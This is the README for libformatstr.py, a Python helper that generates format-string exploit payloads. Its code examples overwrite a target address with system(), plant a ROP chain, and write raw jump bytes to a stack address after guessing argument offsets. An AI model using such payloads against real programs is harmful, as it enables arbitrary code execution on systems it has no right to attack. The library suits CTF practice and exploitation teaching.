libformatstr.py
====================

Small script to simplify format string exploitation.

Usage
---------------------

* Case 1 - replace one dword:

```python
import sys
from libformatstr import FormatStr

addr = 0x08049580
system_addr = 0x080489a3

p = FormatStr()
p[addr] = system_addr

# buf is 14th argument, 4 bytes are already printed
sys.stdout.write( p.payload(14, start_len=4) )
```

* Case 2 - put ROP code somewhere:

```python
import sys
from libformatstr import FormatStr

addr = 0x08049580
rop = [0x080487af, 0x0804873c, 0x080488de]
p = FormatStr()
p[addr] = rop

sys.stdout.write( p.payload(14) )
```

* Case 3 - guess argument number and padding:

```python
import sys
from libformatstr import FormatStr

# let's say we have do_fmt function,
# which gives us only output of format string
# (you can also just copy fmtstr and output manually)

buf_size = 250  # fix buf_size to avoid offset variation
res = do_fmt(make_pattern(buf_size))
argnum, padding = guess_argnum(res, buf_size)

# of course you can use it in payload generation

p = FormatStr(buf_size)
p[0xbffffe70] = "\x70\xfe\xff\xbf\xeb\xfe"  # yes, you can also put strings

sys.stdout.write( p.payload(argnum, padding, 3) ) # we know 3 bytes were printed already
```

About
---------------------

Author: hellman ( hellman1908@gmail.com )

License: GNU General Public License v2 (http://opensource.org/licenses/gpl-2.0.php)
